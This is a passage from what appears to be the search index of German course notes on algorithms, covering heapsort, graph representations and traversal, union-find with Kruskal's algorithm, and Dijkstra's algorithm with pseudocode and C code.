{\n        for (int i : arr)\n            System.out.print(i + \" \");\n        System.out.println();\n    }\n\n    public static void main(String[] args) {\n        int[] arr = {4, 10, 3, 5, 1};\n\n        heapSort(arr);\n\n        System.out.println(\"Sortiertes Array:\");\n        printArray(arr);\n    }\n}\n</code></pre> <pre><code>    # Heapify-Funktion f\u00fcr einen Max-Heap\ndef heapify(arr, n, i):\n    largest = i        # Wurzel\n    left = 2 * i + 1   # Linkes Kind\n    right = 2 * i + 2  # Rechtes Kind\n\n    # Linkes Kind gr\u00f6\u00dfer als Wurzel?\n    if left &lt; n and arr[left] &gt; arr[largest]:\n        largest = left\n\n    # Rechtes Kind gr\u00f6\u00dfer als das gr\u00f6\u00dfte Element?\n    if right &lt; n and arr[right] &gt; arr[largest]:\n        largest = right\n\n    # Falls das gr\u00f6\u00dfte Element nicht die Wurzel ist, tausche\n    if largest != i:\n        arr[i], arr[largest] = arr[largest], arr[i]\n        heapify(arr, n, largest)  # Rekursives Heapify\n\n# Heapsort-Algorithmus\ndef heapsort(arr):\n    n = len(arr)\n\n    # Max-Heap erstellen\n    for i in range(n // 2 - 1, -1, -1):\n        heapify(arr, n, i)\n\n    # Heap sortieren\n    for i in range(n - 1, 0, -1):\n        arr[i], arr[0] = arr[0], arr[i]  # Wurzel ans Ende verschieben\n        heapify(arr, i, 0)\n\n# Test des Heapsort\narr = [4, 10, 3, 5, 1]\nheapsort(arr)\nprint(\"Sortiertes Array:\", arr)\n</code></pre> <p></p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/","title":"Graphen: Grundlagen","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#graphen-grundlagen","title":"Graphen: Grundlagen","text":"<p>Ein Graph ist eine mathematische Struktur, die aus:</p> <ul> <li>Knoten (Vertices) besteht, die Objekte repr\u00e4sentieren,</li> <li>und Kanten (Edges), die Verbindungen zwischen diesen Knoten darstellen.</li> </ul> <p>Graphen werden verwendet, um Beziehungen zwischen Objekten zu modellieren, z.B. in Netzwerken, Routenplanung, Datenbanken oder Sozialen Netzwerken.</p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#arten-von-graphen","title":"Arten von Graphen","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#11-gerichtet-directed-vs-ungerichtet-undirected","title":"1.1. Gerichtet (Directed) vs. Ungerichtet (Undirected)","text":"<ul> <li> <p>Gerichteter Graph (Digraph):</p> <ul> <li>Die Kanten haben eine Richtung (Pfeile).</li> <li>Eine Kante von A nach B ist nicht dasselbe wie von B nach A.</li> <li>Beispiel: Verkehrsnetz (Einbahnstra\u00dfen).</li> </ul> </li> <li> <p>Ungerichteter Graph:</p> <ul> <li>Kanten haben keine Richtung.</li> <li>Eine Kante verbindet Knoten symmetrisch: A \u2194 B.</li> <li>Beispiel: Freundschaften in sozialen Netzwerken.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#12-gewichteter-weighted-vs-ungewichteter-unweighted","title":"1.2. Gewichteter (Weighted) vs. Ungewichteter (Unweighted)","text":"<ul> <li> <p>Gewichteter Graph:</p> <ul> <li>Jede Kante hat ein Gewicht (z.B. Kosten, Entfernung, Zeit).</li> <li>Wird bei k\u00fcrzesten Wegen oder Netzwerkoptimierungen verwendet.</li> </ul> </li> <li> <p>Ungewichteter Graph:</p> <ul> <li>Kanten sind einfach Verbindungen ohne zus\u00e4tzliche Werte.</li> <li>Gut f\u00fcr einfache Struktur-Analysen (z.B. Erreichbarkeit).</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#13-zyklisch-cyclic-vs-azyklisch-acyclic","title":"1.3. Zyklisch (Cyclic) vs. Azyklisch (Acyclic)","text":"<ul> <li> <p>Zyklischer Graph:</p> <ul> <li>Enth\u00e4lt mindestens einen Zyklus (geschlossener Pfad).</li> <li>Beispiel: Stromnetz, Stra\u00dfennetze.</li> <li> <p>Azyklischer Graph (DAG - Directed Acyclic Graph):</p> </li> <li> <p>Enth\u00e4lt keinen Zyklus.</p> </li> <li>Wichtig f\u00fcr: Task-Planung, Versionskontrolle, Kompilierung von Abh\u00e4ngigkeiten.</li> <li> <p>Spezialfall:</p> </li> <li> <p>Ein Baum ist ein ungerichteter, azyklischer, zusammenh\u00e4ngender Graph.</p> </li> </ul> </li> </ul> <p></p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#14-adjazenzmatrix","title":"1.4. Adjazenzmatrix","text":"<ul> <li> <p>Eine Matrix AAA, die angibt, ob zwei Knoten direkt verbunden sind.</p> </li> <li> <p>F\u00fcr ungewichtete Graphen:</p> <ul> <li>\\(A[i][j]=1A[i][j] = 1A[i][j]=1\\), wenn eine Kante von Knoten i nach j existiert.</li> <li>\\(A[i][j]=0A[i][j] = 0A[i][j]=0\\), wenn keine Verbindung besteht.</li> </ul> </li> <li> <p>F\u00fcr gewichtete Graphen:</p> <ul> <li>Die Matrix speichert das Gewicht der Kante anstelle von 1.</li> <li>Kein Pfad = Unendlich (\u221e) oder 0 (je nach Definition).</li> </ul> </li> <li> <p>Speicherbedarf:</p> <ul> <li>\\(O(V2)O(V^2)O(V2)\\) \u2192 Nicht effizient bei gro\u00dfen, sp\u00e4rlichen Graphen.</li> <li>Vorteil: Schneller Zugriff auf Kanten: \\(O(1)O(1)O(1)\\).</li> </ul> </li> <li> <p>Beispiel:</p> </li> </ul> <p>F\u00fcr Knoten {A, B, C} mit Kanten A-B, B-C:</p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#adjazenzmatrix-ungewichtet","title":"Adjazenzmatrix (ungewichtet)","text":"A B C A 0 1 0 B 1 0 1 C 0 1 0","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#adjazenzmatrix-gewichteter-gerichteter-graph","title":"Adjazenzmatrix (gewichteter, gerichteter Graph)","text":"<ul> <li>Gerichteter Graph: Die Matrix ist nicht symmetrisch.</li> <li>Gewichtete Kanten: Zahlen repr\u00e4sentieren die Kosten/Entfernungen.</li> <li>Unverbundene Knoten: Markiert mit \u221e.</li> </ul> A B C A 0 4 2 B \u221e 0 5 C 3 \u221e 0","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#15-adjazenzliste","title":"1.5. Adjazenzliste","text":"<ul> <li> <p>Jeder Knoten speichert eine Liste seiner Nachbarn.</p> </li> <li> <p>Effizient f\u00fcr sp\u00e4rliche Graphen (wenige Kanten im Vergleich zu Knoten).</p> </li> <li> <p>Speicherbedarf:</p> <ul> <li>\\(O(V+E)O(V + E)O(V+E)\\) \u2192 Spart Speicher bei gro\u00dfen Netzwerken.</li> <li> <p>Vorteil:</p> </li> <li> <p>Effizient f\u00fcr Iteration \u00fcber Nachbarn.</p> </li> <li>Nachteil: Pr\u00fcfen, ob eine bestimmte Kante existiert, dauert \\(O(Grad)\\).</li> <li>Beispiel:</li> </ul> </li> </ul> <p>F\u00fcr Knoten {A, B, C} mit Kanten A-B, B-C:</p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#adjazenzliste","title":"\ud83d\udd17 Adjazenzliste","text":"Knoten Knoten Gewicht A     \u2192 B (5) B      \u2192 A,C (4) C      \u2192 B (3)","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#20-graph-traversierung","title":"2.0 Graph-Traversierung","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#21-bfs-breadth-first-search","title":"2.1. BFS (Breadth-First Search)","text":"<p>BFS erkundet den Graphen Schicht f\u00fcr Schicht (Level f\u00fcr Level). Stell dir BFS wie eine Welle vor, die sich gleichm\u00e4\u00dfig ausbreitet.</p> <ul> <li>Durchl\u00e4uft den Graphen Level f\u00fcr Level (Breite zuerst).</li> <li>Verwendet eine Warteschlange (Queue).</li> <li>Gut f\u00fcr das Finden von k\u00fcrzesten Wegen in ungewichteten Graphen.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#bfs-anwendungen","title":"\ud83d\udd11 BFS-Anwendungen:","text":"<ol> <li>K\u00fcrzeste Wege (in ungewichteten Graphen):<ul> <li>BFS findet den k\u00fcrzesten Weg von der Startposition zu allen anderen Knoten.</li> </ul> </li> <li>Zyklus-Erkennung (ungerichtete Graphen):<ul> <li>Wenn ein besuchter Nachbar erneut erreicht wird \u2192 Zyklus existiert.</li> </ul> </li> <li>Bipartite Graphen pr\u00fcfen:<ul> <li>BFS hilft festzustellen, ob der Graph zweifach f\u00e4rbbar ist. </li> </ul> </li> </ol>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#22-dfs-depth-first-search","title":"2.2. DFS (Depth-First Search)","text":"<p>DFS erkundet den Graphen so tief wie m\u00f6glich, bevor es zu einem anderen Pfad zur\u00fcckkehrt. Stell dir DFS wie ein Labyrinth vor: Du gehst immer so tief wie m\u00f6glich in einen Gang hinein, bis du nicht mehr weiterkommst, und gehst dann zur\u00fcck.</p> <ul> <li>Geht so tief wie m\u00f6glich in den Graphen, bevor es zur\u00fccktrackt.</li> <li>Verwendet einen Stack (oft rekursiv implementiert).</li> <li>N\u00fctzlich f\u00fcr Zyklus-Erkennung, Topologische Sortierung, Connected Components.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#dfs-anwendungen","title":"\ud83d\udd11 DFS-Anwendungen:","text":"<ol> <li> <p>Tiefensuchb\u00e4ume (DFS-Trees):</p> <ul> <li>Zeigt den Ablauf der Traversierung.</li> <li>R\u00fcckw\u00e4rtskanten (Back Edges) \u2192 helfen, Zyklen zu erkennen.</li> <li> <p>Zyklus-Erkennung:</p> </li> <li> <p>Falls ein besuchter Knoten erneut erreicht wird, existiert ein Zyklus.</p> </li> <li> <p>Artikulationspunkte (Critical Points):</p> </li> <li> <p>Knoten, deren Entfernung den Graphen in zwei Teile trennt.</p> </li> <li>Wichtig bei Netzwerken zur Erkennung von Schwachstellen. </li> </ul> </li> </ol>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#bipartite-graphen-erkennung-mit-bfs-dfs","title":"Bipartite Graphen: Erkennung mit BFS &amp; DFS","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#was-ist-ein-bipartiter-graph","title":"Was ist ein bipartiter Graph?","text":"<p>Ein bipartiter Graph ist ein Graph, dessen Knoten in zwei disjunkte Mengen AAA und BBB aufgeteilt werden k\u00f6nnen, sodass keine Kante zwei Knoten derselben Menge verbindet.</p> <ul> <li>Formell: Ein Graph ist bipartit, wenn er 2-f\u00e4rbbar ist, d.h. man kann ihn mit zwei Farben so f\u00e4rben, dass keine zwei benachbarten Knoten dieselbe Farbe haben.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#erkennung-eines-bipartiten-graphen","title":"Erkennung eines bipartiten Graphen","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#strategie-2-farbigkeit","title":"Strategie: 2-F\u00e4rbigkeit","text":"<ol> <li>F\u00e4rbe den Startknoten mit Farbe 0.</li> <li>F\u00e4rbe alle Nachbarn mit der anderen Farbe (z.B. Farbe 1).</li> <li>F\u00e4rbe deren Nachbarn wieder mit der urspr\u00fcnglichen Farbe (Farbe 0).</li> <li>Widerspruch:<ul> <li>Falls zwei benachbarte Knoten dieselbe Farbe haben \u2192 nicht bipartit.</li> <li>Falls die F\u00e4rbung ohne Konflikte abgeschlossen werden kann \u2192 bipartit.</li> </ul> </li> </ol>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#starke-zusammenhangskomponenten-strongly-connected-components-sccs","title":"\ud83c\udf10Starke Zusammenhangskomponenten (Strongly Connected Components, SCCs)","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#definition","title":"Definition:","text":"<p>In einem gerichteten Graphen ist eine starke Zusammenhangskomponente (SCC) eine Teilmenge von Knoten, bei denen jeder Knoten von jedem anderen erreichbar ist.</p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#kosarajus-algorithmus-dfs-basiert","title":"Kosaraju\u2019s Algorithmus (DFS-basiert):","text":"<ol> <li>F\u00fchre DFS aus und speichere die Abschlusszeiten der Knoten.</li> <li>Spiegle den Graphen (drehe alle Kanten um).</li> <li>F\u00fchre DFS erneut aus, diesmal in der Reihenfolge der abnehmenden Abschlusszeiten.</li> <li>Jeder DFS-Durchlauf ergibt eine SCC.</li> </ol>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/2.%20Grundlagen_Graph/#anwendung","title":"\u26a1 Anwendung:","text":"<ul> <li>Netzwerk-Analyse</li> <li>Abh\u00e4ngigkeits-Graphen (z.B. bei Software-Paketen)</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/3.%20Union-Find%20und%20Kruskal/","title":"Union Find","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/3.%20Union-Find%20und%20Kruskal/#union-find","title":"Union Find","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/3.%20Union-Find%20und%20Kruskal/#1-begriffe-grundlagen","title":"\ud83d\udcda 1\ufe0f\u20e3 Begriffe &amp; Grundlagen","text":"<ol> <li> <p>Menge (Set):     Eine Gruppe von Elementen, die zusammengeh\u00f6ren.     Beispiel: <code>{1, 2, 3}</code> ist eine Menge.</p> </li> <li> <p>Disjunkte Mengen:     Mengen, die keine gemeinsamen Elemente haben.     Beispiel: <code>{1, 2}</code> und <code>{3, 4}</code> sind disjunkt.</p> </li> <li> <p>Repr\u00e4sentant (Root/Wurzel):     Ein \"Leader\" der Menge.     Jeder Knoten zeigt (direkt oder indirekt) auf diesen Repr\u00e4sentanten.</p> </li> <li> <p>Union-Find (Disjoint-Set Union, DSU):     Eine Datenstruktur, die hilft:</p> <ul> <li>Zu pr\u00fcfen, ob zwei Elemente in derselben Menge sind (<code>find</code>).</li> <li>Zwei Mengen zu einer Menge zu vereinigen (<code>union</code>).</li> </ul> </li> </ol>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/3.%20Union-Find%20und%20Kruskal/#zusammenfassung-der-wichtigsten-punkte","title":"\ud83d\udcdd Zusammenfassung der wichtigsten Punkte","text":"Begriff Beschreibung Union Verbindet zwei Mengen (macht einen gemeinsamen Repr\u00e4sentanten). Find Findet den Repr\u00e4sentanten (Wurzel) einer Menge. Rank Sch\u00e4tzung der \"Tiefe\" des Baumes (hilft, die Struktur beim <code>union</code> flach zu halten). Path Compression Optimiert die <code>find</code>-Methode, indem alle Knoten direkt mit der Wurzel verbunden werden.","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/3.%20Union-Find%20und%20Kruskal/#2-operationen-in-union-find","title":"\ud83d\udd0d 2\ufe0f\u20e3 Operationen in Union-Find","text":"<ol> <li> <p><code>find(x)</code> - Finde den Repr\u00e4sentanten der Menge von <code>x</code>.</p> <ul> <li>Gibt den \"Root\" der Menge zur\u00fcck, zu der <code>x</code> geh\u00f6rt.</li> <li>Beispiel: In <code>{1 \u2192 2 \u2192 3}</code>, ist <code>3</code> der Repr\u00e4sentant von <code>1</code>.</li> <li> <p><code>union(x, y)</code> - Vereine die Mengen von <code>x</code> und <code>y</code>.</p> </li> <li> <p>Falls <code>x</code> und <code>y</code> in verschiedenen Mengen sind \u2192 Vereine sie.</p> </li> <li>Nach <code>union(x, y)</code> haben beide Elemente denselben Repr\u00e4sentanten.</li> </ul> </li> <li> <p><code>union</code> (mit Rank):</p> <ul> <li>Bestimmt, wie Mengen zusammengef\u00fchrt werden, um die Struktur flach zu halten.</li> <li>Flache B\u00e4ume \u2192 schnellere <code>find</code>-Operationen.</li> <li> <p><code>find</code> (mit Path Compression):</p> </li> <li> <p>Optimiert die Struktur nachtr\u00e4glich, wenn wir nach einem Repr\u00e4sentanten suchen.</p> </li> <li>Macht den Baum noch flacher, indem alle Knoten direkt mit der Wurzel verbunden werden.</li> </ul> </li> </ol> \ud83d\udd0d Pseudo-Code-Unoptimiert\ud83d\udcdd Pseudo-Code-Optimiert(Rank, Path Compression) <pre><code>INITIALISIERE parent[x] = x f\u00fcr jedes x\n\nFUNKTION find(x):\n    WENN parent[x] == x:\n        GIB x zur\u00fcck\n    ANDERNFALLS:\n        GIB find(parent[x]) zur\u00fcck\n\nFUNKTION union(x, y):\n    rootX = find(x)\n    rootY = find(y)\n    WENN rootX != rootY:\n        parent[rootY] = rootX  // Mache rootY zum Kind von rootX\n</code></pre> <pre><code>INITIALISIERE parent[x] = x, rank[x] = 0 f\u00fcr jedes x\n\nFUNKTION find(x):\n    WENN parent[x] != x:\n        parent[x] = find(parent[x])  // Path Compression\n    GIB parent[x] zur\u00fcck\n\nFUNKTION union(x, y):\n    rootX = find(x)\n    rootY = find(y)\n\n    WENN rootX == rootY:\n        GIB  // Schon in derselben Menge\n\n    WENN rank[rootX] &lt; rank[rootY]:\n        parent[rootX] = rootY  // rootY bleibt Wurzel\n    ANDERNFALLS WENN rank[rootX] &gt; rank[rootY]:\n        parent[rootY] = rootX  // rootX bleibt Wurzel\n    ANDERNFALLS:\n        parent[rootY] = rootX  // Einer wird Wurzel\n        rank[rootX] += 1       // Rank erh\u00f6hen\n</code></pre> <p></p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/3.%20Union-Find%20und%20Kruskal/#fazit","title":"\ud83d\ude80 Fazit","text":"<ul> <li>\u2705 Union verbindet zwei Mengen.</li> <li>\u2705 Find findet den Repr\u00e4sentanten (Root) einer Menge.</li> <li>\u2705 Rank sorgt daf\u00fcr, dass die B\u00e4ume flach bleiben.</li> <li>\u2705 Path Compression macht die B\u00e4ume nachtr\u00e4glich noch flacher.</li> <li>\u2705 Optimierte Union-Find ist extrem effizient: \\(O(\\log n)\\) bis \\(O(1)\\) f\u00fcr <code>find</code> und <code>union</code>.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/3.%20Union-Find%20und%20Kruskal/#kruskals-algorithmus-schritt-fur-schritt","title":"Kruskal\u2019s Algorithmus - Schritt-f\u00fcr-Schritt","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/3.%20Union-Find%20und%20Kruskal/#was-ist-das-ziel-von-kruskals-algorithmus","title":"\ud83d\udcda Was ist das Ziel von Kruskal\u2019s Algorithmus?","text":"<p>Ziel:</p> <ul> <li>Finde den Minimalen Spannbaum (MST) eines gewichteten, ungerichteten Graphen.</li> <li>Alle Knoten so g\u00fcnstig wie m\u00f6glich miteinander verbinden.</li> </ul> <p>Ein Minimaler Spannbaum (MST):</p> <ul> <li>Verbindet alle Knoten des Graphen.</li> <li>Minimiert die Gesamtkosten der Kanten (Summe der Kantengewichte).</li> <li>Keine Zyklen \u2192 der MST ist ein baumartiges Netzwerk.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/3.%20Union-Find%20und%20Kruskal/#wofur-ist-das-nutzlich","title":"\ud83d\udd11 Wof\u00fcr ist das n\u00fctzlich?","text":"<ul> <li>\u2705 Optimale Netzwerke: Minimierung der L\u00e4nge von Stra\u00dfen, Kabeln, Netzwerken.</li> <li>\u2705 Kosteneinsparung: Verbindungen herstellen, ohne unn\u00f6tige \"teure\" Kanten zu verwenden.</li> <li>\u2705 Effiziente Ressourcenverteilung: Z.B. in Computernetzwerken, Elektrizit\u00e4tsnetzen, Transportnetzen.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/3.%20Union-Find%20und%20Kruskal/#grundidee-wie-funktioniert","title":"Grundidee - Wie funktioniert:","text":"<ol> <li>Sortiere alle Kanten nach ihrem Gewicht (aufsteigend).</li> <li>F\u00fcge die leichteste Kante zum MST hinzu, sofern kein Zyklus entsteht.</li> <li>Wiederhole, bis der MST alle Knoten verbindet.</li> </ol>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/3.%20Union-Find%20und%20Kruskal/#wichtig","title":"\ud83d\udea9 Wichtig:","text":"<ul> <li>Um Zyklen zu vermeiden, verwenden wir den Union-Find-Algorithmus.</li> <li>Wenn zwei Knoten bereits im selben Set sind \u2192 Kante nicht hinzuf\u00fcgen (w\u00fcrde einen Zyklus bilden).</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/3.%20Union-Find%20und%20Kruskal/#3-beispiel-zur-veranschaulichung","title":"\ud83c\udf10 3\ufe0f\u20e3 Beispiel zur Veranschaulichung","text":"<p>Stell dir vor, wir wollen St\u00e4dte (A, B, C, D) mit Stromnetze verbinden. Jedes Stromnetz hat Kosten (Gewicht). </p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/3.%20Union-Find%20und%20Kruskal/#4-kruskals-algorithmus-schritt-fur-schritt","title":"4\ufe0f\u20e3 Kruskal\u2019s Algorithmus - Schritt-f\u00fcr-Schritt","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/3.%20Union-Find%20und%20Kruskal/#die-zentrale-regel","title":"Die zentrale Regel:","text":"<ul> <li>Elemente d\u00fcrfen nicht doppelt in dieselbe Menge aufgenommen werden sonst entsteht ein Zyklus</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/3.%20Union-Find%20und%20Kruskal/#schritt-1-kantenliste-aufstellen-und-sortieren-nach-gewicht","title":"\u2705 Schritt 1: Kantenliste aufstellen und sortieren (nach Gewicht)","text":"<ol> <li>(A, C) = 1</li> <li>(B, D) = 2</li> <li>(A, D) = 3</li> <li>(A, B) = 4</li> <li>(C, D) = 5</li> </ol>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/3.%20Union-Find%20und%20Kruskal/#schritt-2-kanten-auswahlen-kein-zyklus-bilden","title":"\u2705 Schritt 2: Kanten ausw\u00e4hlen (kein Zyklus bilden)","text":"<p>1\ufe0f\u20e3 Kante (A, C) = 1</p> <ul> <li>Verbinden \u2192 Kein Zyklus \u2192 Hinzuf\u00fcgen</li> </ul> <p>2\ufe0f\u20e3 Kante (B, D) = 2</p> <ul> <li>Verbinden \u2192 Kein Zyklus \u2192 Hinzuf\u00fcgen</li> </ul> <p>3\ufe0f\u20e3 Kante (A, D) = 3</p> <ul> <li>Verbinden \u2192 Kein Zyklus \u2192 Hinzuf\u00fcgen</li> </ul> <p>4\ufe0f\u20e3 Kante (A, B) = 4</p> <ul> <li>W\u00fcrde einen Zyklus bilden (A-D-B) \u2192 Nicht hinzuf\u00fcgen</li> </ul> <p>5\ufe0f\u20e3 Kante (C, D) = 5</p> <ul> <li>W\u00fcrde einen Zyklus bilden (C-A-D) \u2192 Nicht hinzuf\u00fcgen</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/3.%20Union-Find%20und%20Kruskal/#ergebnis","title":"\ud83c\udfc6 Ergebnis:","text":"<ul> <li>Minimaler Spannbaum (MST):<ul> <li>Kanten: (A, C), (B, D), (A, D)</li> <li>Gesamtkosten: 1 + 2 + 3 = 6</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/3.%20Union-Find%20und%20Kruskal/#6-vergleich-mit-und-ohne-kruskal","title":"\ud83d\udcca 6\ufe0f\u20e3 Vergleich: Mit und ohne Kruskal","text":"Ohne Kruskal (beliebige Verbindungen) Mit Kruskal (MST) A-B = 4 A-C = 1 A-C = 1 B-D = 2 B-D = 2 A-D = 3 A-D = 3 Gesamtkosten = 6 C-D = 5 Gesamtkosten = 15 <ul> <li>Ohne Kruskal: Wir k\u00f6nnten unn\u00f6tig teure Kanten verwenden.</li> <li>Mit Kruskal: Wir verwenden nur die g\u00fcnstigsten Kanten, um alle zu verbinden.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/","title":"K\u00fcrzeste Weg - Algorithmen","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#kurzeste-weg-algorithmen","title":"K\u00fcrzeste Weg - Algorithmen","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#dijkstra-algorithmus-kurzeste-weg","title":"\ud83d\ude80 Dijkstra-Algorithmus - K\u00fcrzeste Weg","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#1-was-ist-der-dijkstra-algorithmus","title":"\ud83d\udcda 1\ufe0f\u20e3 Was ist der Dijkstra-Algorithmus?","text":"<p>Der Dijkstra-Algorithmus ist ein Algorithmus zur Berechnung des k\u00fcrzesten Weges von einem Startknoten zu allen anderen Knoten in einem gewichteten Graphen (mit nicht-negativen Kantengewichten).</p> <ul> <li>Ziel: Finde den k\u00fcrzesten Weg (minimales Gesamtkosten) von einem Startknoten zu allen anderen Knoten.</li> <li>Wichtig: Funktioniert nur bei nicht-negativen Kantengewichten.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#2-grundidee","title":"\ud83d\udd11 2\ufe0f\u20e3 Grundidee","text":"<ol> <li> <p>Initialisierung:</p> <ul> <li>Setze die Distanz zum Startknoten = 0.</li> <li>Setze die Distanzen zu allen anderen Knoten = \u221e (unendlich).</li> <li> <p>Verarbeitung:</p> </li> <li> <p>W\u00e4hle den Knoten mit der kleinsten bekannten Distanz (z.B. mit einer Priorit\u00e4tswarteschlange/Heap).</p> </li> <li>Aktualisiere die Distanzen zu den Nachbarn, wenn ein k\u00fcrzerer Weg gefunden wird (Relaxation).</li> <li> <p>Wiederholen:</p> </li> <li> <p>Markiere den aktuellen Knoten als \"besucht\" (fertig).</p> </li> <li>Wiederhole den Prozess f\u00fcr den n\u00e4chsten unbesuchten Knoten mit der kleinsten Distanz.</li> <li> <p>Ende:</p> </li> <li> <p>Der Algorithmus stoppt, wenn alle Knoten besucht wurden.</p> </li> </ul> </li> </ol> \ud83d\udd0d Pseudo-Code\ud83d\udd0d C-Code(mit Priorit\u00e4tswarteschlange) <pre><code>DIJKSTRA(G, start):\n    DISTANZ[start] = 0\n    F\u00dcR alle anderen Knoten v:\n        DISTANZ[v] = \u221e\n\n    INITIALISIERE eine leere Priorit\u00e4tswarteschlange Q\n    F\u00dcGE start mit Distanz 0 in Q ein\n\n    W\u00c4HREND Q nicht leer:\n        u = Knoten mit kleinster Distanz aus Q\n        MARKIERE u als besucht\n\n        F\u00dcR jeden Nachbarn v von u:\n            WENN (DISTANZ[u] + KOSTEN(u, v)) &lt; DISTANZ[v]:\n                DISTANZ[v] = DISTANZ[u] + KOSTEN(u, v)\n                AKTUALISIERE v in Q\n</code></pre> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;limits.h&gt;\n\n#define V 4  // Anzahl der Knoten\n#define INF INT_MAX\n\n// Funktion zur Suche des Knotens mit der kleinsten Distanz\nint minDistance(int dist[], int visited[]) {\n    int min = INF, min_index;\n    for (int v = 0; v &lt; V; v++) {\n        if (visited[v] == 0 &amp;&amp; dist[v] &lt;= min) {\n            min = dist[v], min_index = v;\n        }\n    }\n    return min_index;\n}\n\nvoid dijkstra(int graph[V][V], int start) {\n    int dist[V];\n    int visited[V];\n\n    for (int i = 0; i &lt; V; i++) {\n        dist[i] = INF;\n        visited[i] = 0;\n    }\n    dist[start] = 0;\n\n    for (int count = 0; count &lt; V - 1; count++) {\n        int u = minDistance(dist, visited);\n        visited[u] = 1;\n\n        for (int v = 0; v &lt; V; v++) {\n            if (!visited[v] &amp;&amp; graph[u][v] &amp;&amp;\n                dist[u] != INF &amp;&amp;\n                dist[u] + graph[u][v] &lt; dist[v]) {\n                dist[v] = dist[u] + graph[u][v];\n            }\n        }\n    }\n\n    printf(\"Knoten \\t K\u00fcrzeste Distanz vom Start (%d)\\n\", start);\n    for (int i = 0; i &lt; V; i++) {\n        printf(\"%d \\t\\t %d\\n\", i, dist[i]);\n    }\n}\n\nint main() {\n    int graph[V][V] = {\n        {0, 4, 1, 2},   // A (0)\n        {4, 0, 0, 5},   // B (1)\n        {1, 0, 0, 3},   // C (2)\n        {2, 5, 3, 0}    // D (3)\n    };\n\n    dijkstra(graph, 0);  // Startknoten A (Index 0)\n    return 0;\n}\n</code></pre>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#3-beispielgraph","title":"\ud83d\uddfa\ufe0f 3\ufe0f\u20e3 